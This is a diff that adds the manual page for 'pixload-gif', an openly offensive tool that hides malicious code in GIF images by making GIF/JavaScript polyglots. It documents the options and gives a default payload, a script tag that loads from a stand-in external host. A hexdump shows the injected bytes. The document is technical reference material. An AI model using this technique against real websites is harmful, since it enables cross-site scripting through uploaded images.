@@ -1,0 +1,84 @@
+=pod
+
+=encoding UTF-8
+
+=head1 NAME
+
+pixload-gif - hide payload/malicious code in GIF images
+
+=head1 SYNOPSIS
+
+B<pixload-gif> [I<OPTION>]... I<FILE>
+
+=head1 DESCRIPTION
+
+B<pixload-gif> creates a GIF Image with payload, or injects payload into
+existing image.
+
+=head1 OPTIONS
+
+Mandatory arguments to long options are mandatory for short options too.
+
+=over 8
+
+=item B<-W>, B<--pixelwidth> I<INTEGER>
+
+Set pixel width for the new image.
+Default is 10799.
+
+The option has no effect since B<pixload-gif> rewrites pixel width bytes
+with C</*> characters, to prepare the polyglot image.
+
+=item B<-H>, B<--pixelheight> I<INTEGER>
+
+Set pixel height for the new image.
+Default is 32.
+
+=item B<-P>, B<--payload> I<STRING>
+
+Set payload for injection.
+Default is C<< <script src=//example.com></script> >>.
+
+=item B<-v>, B<--version>
+
+Print version and exit.
+
+=item B<-h>, B<--help>
+
+Print help and exit.
+
+=back
+
+=head1 EXAMPLE
+
+  $ pixload-gif payload.gif
+  ........ GIF Payload Creator/Injector .........
+  ...............................................
+  ... https://github.com/chinarulezzz/pixload ...
+  ...............................................
+
+  [>] Generating output file
+  [✔] File saved to: payload.gif
+
+  [>] Injecting payload into payload.gif
+  [✔] Payload was injected successfully
+
+  payload.gif: GIF image data, version 87a, 10799 x 32
+
+  00000000  47 49 46 38 37 61 2f 2a  20 00 80 00 00 04 02 04  |GIF87a/* .......|
+  00000010  00 00 00 2c 00 00 00 00  20 00 20 00 00 02 1e 84  |...,.... . .....|
+  00000020  8f a9 cb ed 0f a3 9c b4  da 8b b3 de bc fb 0f 86  |................|
+  00000030  e2 48 96 e6 89 a6 ea ca  b6 ee 0b 9b 05 00 3b 2a  |.H............;*|
+  00000040  2f 3d 31 3b 3c 73 63 72  69 70 74 20 73 72 63 3d  |/=1;<script src=|
+  00000050  2f 2f 65 78 61 6d 70 6c  65 2e 63 6f 6d 3e 3c 2f  |//example.com></|
+  00000060  73 63 72 69 70 74 3e 3b                           |script>;|
+  00000068
+
+=head1 SEE ALSO
+
+L<pixload-bmp(1)|https://github.com/chinarulezzz/pixload/blob/master/pixload-bmp.1.pod>,
+L<pixload-jpg(1)|https://github.com/chinarulezzz/pixload/blob/master/pixload-jpg.1.pod>,
+L<pixload-png(1)|https://github.com/chinarulezzz/pixload/blob/master/pixload-png.1.pod>,
+L<pixload-webp(1)|https://github.com/chinarulezzz/pixload/blob/master/pixload-webp.1.pod>
+
+=cut
